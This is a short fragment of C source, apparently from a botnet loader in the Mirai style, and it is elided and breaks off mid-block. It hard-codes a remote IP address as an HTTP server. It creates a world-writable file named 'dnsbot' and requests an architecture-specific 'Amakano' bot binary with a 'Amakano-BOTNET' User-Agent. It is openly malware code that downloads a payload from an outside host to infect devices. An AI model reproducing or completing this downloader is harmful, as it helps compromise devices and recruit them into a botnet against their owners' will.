...
#define HTTP_SERVER utils_inet_addr(157,230,98,129)

#define EXEC_MSG            "Amakano\n"
#define EXEC_MSG_LEN        4

#define DOWNLOAD_MSG        "Botnet\n"
...
inline void run(void)
{
    ...
    ffd = open("dnsbot", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /vb/Amakano." BOT_ARCH " HTTP/1.0\r\nUser-Agent: Amakano-BOTNET\r\n\r\n", 16 + arch_strlen + 13) != (16 + arch_strlen + 13))
    {
#ifdef DEBUG
